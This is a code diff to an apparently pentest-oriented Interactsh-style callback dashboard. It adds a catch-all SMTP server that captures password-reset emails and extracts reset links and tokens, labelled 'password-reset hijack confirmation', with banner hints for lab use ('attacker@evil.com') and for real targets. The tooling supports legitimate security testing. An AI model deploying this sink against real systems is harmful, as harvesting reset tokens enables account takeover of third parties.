@@ -8,10 +8,14 @@ import socket
 import requests
 import json
 import argparse
+import re
+from email import message_from_bytes
+from email.policy import default as _email_policy
 
 app = Flask(__name__)
 
 interactions = []
+emails = []          # captured SMTP messages (password-reset hijack confirmation)
 MY_PUBLIC_IP = None
 
 PRIVATE_PREFIXES = (
@@ -23,7 +27,7 @@ PRIVATE_PREFIXES = (
     "::1", "0.0.0.0",
 )
 
-INTERNAL_PATHS = ("/api/logs", "/api/poll", "/api/clear", "/favicon.ico")
+INTERNAL_PATHS = ("/api/logs", "/api/poll", "/api/clear", "/api/mail", "/api/mail/clear", "/favicon.ico")
 
 
 def get_my_public_ip():
@@ -99,6 +103,109 @@ def interactions_as_text():
     return "\n".join(lines)
 
 
+# ─── SMTP sink (password-reset email capture) ──────────────────────────────────
+
+# Reset links and tokens smuggled inside the delivered email.
+_MAIL_LINK_RE = re.compile(r'https?://[^\s"\'<>\)\]]+', re.IGNORECASE)
+_MAIL_TOKEN_RE = re.compile(
+    r'(?:token|code|reset|verify|confirm|otp|key|t)=([A-Za-z0-9\-_\.]{6,})',
+    re.IGNORECASE,
+)
+
+
+def _extract_mail_parts(raw_bytes):
+    """Parse raw RFC822 bytes → (subject, from, to, cc, body, links, tokens)."""
+    try:
+        msg = message_from_bytes(raw_bytes, policy=_email_policy)
+    except Exception:
+        text = raw_bytes.decode("utf-8", errors="replace")
+        return "", "", "", "", text, _MAIL_LINK_RE.findall(text), []
+
+    subject = msg.get("subject", "") or ""
+    from_hdr = msg.get("from", "") or ""
+    to_hdr = msg.get("to", "") or ""
+    cc_hdr = msg.get("cc", "") or ""
+
+    text, html = "", ""
+    if msg.is_multipart():
+        for part in msg.walk():
+            ctype = part.get_content_type()
+            try:
+                if ctype == "text/plain":
+                    text += part.get_content()
+                elif ctype == "text/html":
+                    html += part.get_content()
+            except Exception:
+                payload = part.get_payload(decode=True)
+                if payload:
+                    text += payload.decode("utf-8", errors="replace")
+    else:
+        try:
+            content = msg.get_content()
+            if msg.get_content_type() == "text/html":
+                html = content
+            else:
+                text = content
+        except Exception:
+            payload = msg.get_payload(decode=True)
+            text = payload.decode("utf-8", errors="replace") if payload else ""
+
+    body = text or html
+    links = _MAIL_LINK_RE.findall(body)
+    tokens = []
+    for candidate in links + [body]:
+        for m in _MAIL_TOKEN_RE.finditer(candidate):
+            if m.group(1) not in tokens:
+                tokens.append(m.group(1))
+    return subject, str(from_hdr), str(to_hdr), str(cc_hdr), body, links, tokens
+
+
+class _MailSink:
+    """aiosmtpd handler: accept any recipient, store the message."""
+
+    async def handle_RCPT(self, server, session, envelope, address, rcpt_options):
+        envelope.rcpt_tos.append(address)
+        return "250 OK"
+
+    async def handle_DATA(self, server, session, envelope):
+        subject, from_hdr, to_hdr, cc_hdr, body, links, tokens = _extract_mail_parts(envelope.content)
+        entry = {
+            "time": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
+            "mail_from": envelope.mail_from,
+            "rcpt_tos": list(envelope.rcpt_tos),   # envelope recipients = who REALLY got it
+            "from": from_hdr,
+            "to": to_hdr,
+            "cc": cc_hdr,
+            "subject": subject,
+            "body": body[:5000],
+            "links": links[:20],
+            "tokens": tokens[:20],
+        }
+        emails.append(entry)
+        print(f"\033[95m[MAIL] {entry['time']} | from={envelope.mail_from} "
+              f"| rcpt={', '.join(entry['rcpt_tos'])} | subj={subject!r}\033[0m")
+        if tokens:
+            print(f"    \033[91m→ token(s): {', '.join(tokens[:5])}\033[0m")
+        return "250 Message accepted for delivery"
+
+
+def start_smtp_sink(host, port):
+    """Start the catch-all SMTP server in a background thread. Returns controller or None."""
+    try:
+        from aiosmtpd.controller import Controller
+    except ImportError:
+        print("\033[93m[!] aiosmtpd not installed — SMTP sink disabled "
+              "(pip install aiosmtpd)\033[0m")
+        return None
+    try:
+        controller = Controller(_MailSink(), hostname=host, port=port)
+        controller.start()
+        return controller
+    except Exception as e:
+        print(f"\033[91m[!] SMTP sink failed on {host}:{port}: {e}\033[0m")
+        return None
+
+
 # ─── Routes ───────────────────────────────────────────────────────────────────
 
 @app.before_request
@@ -141,6 +248,18 @@ def api_poll():
 @app.route("/api/clear", methods=["GET", "POST"])
 def clear_logs():
     interactions.clear()
+    return jsonify({"status": "cleared"})
+
+
+@app.route("/api/mail")
+def api_mail():
+    """Captured SMTP messages — polled by gyp's mail_analysis module."""
+    return jsonify(emails)
+
+
+@app.route("/api/mail/clear", methods=["GET", "POST"])
+def clear_mail():
+    emails.clear()
     return jsonify({"status": "cleared"})
 
 
@@ -497,18 +616,35 @@ def render_dashboard():
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Mini Interactsh Dashboard")
-    parser.add_argument("-p", "--port", type=int, default=8000, help="Port (default: 8000)")
+    parser.add_argument("-p", "--port", type=int, default=8000, help="HTTP port (default: 8000)")
     parser.add_argument("--host", default="0.0.0.0", help="Bind address (default: 0.0.0.0)")
+    parser.add_argument("--smtp-port", type=int, default=1025,
+                        help="SMTP sink port (default: 1025; use 25 as root for real MX delivery)")
+    parser.add_argument("--no-smtp", action="store_true", help="Disable the SMTP sink")
     args = parser.parse_args()
 
     MY_PUBLIC_IP = get_my_public_ip()
+
+    smtp_ctrl = None
+    if not args.no_smtp:
+        smtp_ctrl = start_smtp_sink(args.host, args.smtp_port)
+
     print(f"\033[96m┌─ Interact Dashboard\033[0m")
     print(f"\033[96m├─ Listening on {args.host}:{args.port}\033[0m")
     print(f"\033[96m├─ Dashboard: http://localhost:{args.port}/\033[0m")
     print(f"\033[96m├─ Poll API:  http://localhost:{args.port}/api/poll\033[0m")
+    if smtp_ctrl:
+        print(f"\033[95m├─ SMTP sink: {args.host}:{args.smtp_port}  (catch-all → /api/mail)\033[0m")
+        print(f"\033[95m├─ Catch-all: ANY address is accepted — no mailbox to create.\033[0m")
+        print(f"\033[95m├─   • local lab: point the app's SMTP here, then gyp -e attacker@evil.com (any ≠ victim)\033[0m")
+        print(f"\033[95m├─   • real target: MX of your domain → this host, then gyp -e anything@your-domain\033[0m")
     if MY_PUBLIC_IP:
         print(f"\033[96m├─ Public IP:  {MY_PUBLIC_IP} (excluded)\033[0m")
     print(f"\033[93m├─ ngrok: ngrok http {args.port} --request-header-add 'ngrok-skip-browser-warning:1'\033[0m")
     print(f"\033[96m└─ Waiting for interactions...\033[0m")
 
-    app.run(host=args.host, port=args.port)
+    try:
+        app.run(host=args.host, port=args.port)
+    finally:
+        if smtp_ctrl:
+            smtp_ctrl.stop()
